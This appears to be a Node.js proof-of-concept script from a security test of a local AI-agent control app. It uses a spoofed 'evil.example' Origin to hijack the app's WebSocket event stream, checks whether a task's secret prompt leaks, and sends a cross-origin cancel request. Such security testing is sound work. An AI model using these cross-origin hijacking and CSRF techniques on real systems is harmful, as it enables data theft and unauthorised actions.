import { createRequire } from 'node:module'; const WebSocket = createRequire('D:/codes/ai/AgentBox/agent-control-center-claude/package.json')('ws');
const ws = new WebSocket('ws://127.0.0.1:18788/ws/events', { headers: { Origin: 'https://evil.example' } });
const seen = [];
ws.on('open', async () => {
  console.log('WS open with foreign Origin: accepted');
  // 模擬合法 UI 建立任務
  const r = await fetch('http://127.0.0.1:18788/api/tasks', { method: 'POST', headers: { 'content-type': 'application/json' }, body: JSON.stringify({ prompt: 'secret prompt text', workflow: 'manual' }) });
  const task = await r.json();
  setTimeout(async () => {
    const leaked = seen.filter((e) => e.taskId === task.id);
    console.log('events leaked to foreign-origin socket:', leaked.length, 'types:', [...new Set(leaked.map((e) => e.type))].join(','));
    console.log('prompt visible:', JSON.stringify(leaked).includes('secret prompt text'));
    // 瀏覽器 no-cors 簡單請求：POST、無 body、無 content-type、帶外域 Origin
    const c = await fetch(`http://127.0.0.1:18788/api/tasks/${task.id}/cancel`, { method: 'POST', headers: { Origin: 'https://evil.example' } });
    console.log('cancel without body/content-type ->', c.status, await c.text());
    ws.close();
  }, 1500);
});
ws.on('message', (d) => { try { seen.push(JSON.parse(String(d))); } catch {} });
ws.on('error', (e) => console.log('WS error', e.message));
